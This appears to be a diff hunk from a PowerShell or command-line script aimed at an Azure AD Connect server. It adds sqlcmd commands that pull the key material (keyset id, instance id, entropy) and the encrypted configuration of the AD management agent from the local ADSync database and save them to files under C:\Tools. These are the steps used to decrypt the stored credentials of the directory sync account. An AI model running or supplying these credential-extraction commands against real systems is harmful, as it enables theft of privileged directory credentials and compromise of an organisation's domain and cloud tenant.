@@ -12,6 +12,11 @@ az rest --method GET --uri 'https://graph.windows.net/7FA7586B-5364-4213-A53A-C9
 
 
 
+sqlcmd -S "(localdb)\.\ADSync" -d ADSync -Q "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration" -o C:\Tools\ks.txt
+sqlcmd -S "(localdb)\.\ADSync" -d ADSync -Q "SELECT private_configuration_xml FROM mms_management_agent WHERE ma_type = 'AD'" -o C:\Tools\config.txt
+sqlcmd -S "(localdb)\.\ADSync" -d ADSync -Q "SELECT encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'" -o C:\Tools\crypted.txt
+
+
 $client = New-Object System.Data.SqlClient.SqlConnection
 $client.ConnectionString = "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"
 $client.Open()
